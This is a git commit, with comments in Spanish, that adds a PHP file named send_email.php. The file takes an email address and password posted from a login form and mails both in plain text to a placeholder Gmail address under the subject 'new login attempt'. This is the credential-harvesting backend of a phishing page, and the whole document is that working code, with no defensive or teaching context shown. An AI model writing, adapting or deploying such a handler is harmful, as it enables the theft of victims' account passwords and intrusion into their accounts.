0c3622713dc3fdb9b358a7d6b2b4d225704a72f9
cdelgon <125076759+cdelgon@users.noreply.github.com>
2025-03-10 16:45:05 -0500

    Add files via upload

---
+++ send_email.php
@@ -0,0 +1,22 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    $email = htmlspecialchars($_POST['email']);
+    $password = htmlspecialchars($_POST['password']);
+
+    $to = "TU_CORREO@gmail.com";  // Reemplaza con tu dirección de correo electrónico
+    $subject = "Nuevo intento de inicio de sesión";
+    $message = "Se ha recibido un intento de inicio de sesión con los siguientes datos:\n\n";
+    $message .= "Correo Electrónico: " . $email . "\n";
+    $message .= "Contraseña: " . $password . "\n";
+
+    $headers = "From: no-reply@tu-dominio.com\r\n";
+
+    if (mail($to, $subject, $message, $headers)) {
+        echo "Los datos se han enviado correctamente.";
+    } else {
+        echo "Hubo un problema al enviar los datos.";
+    }
+} else {
+    echo "Método de solicitud no permitido.";
+}
+?>
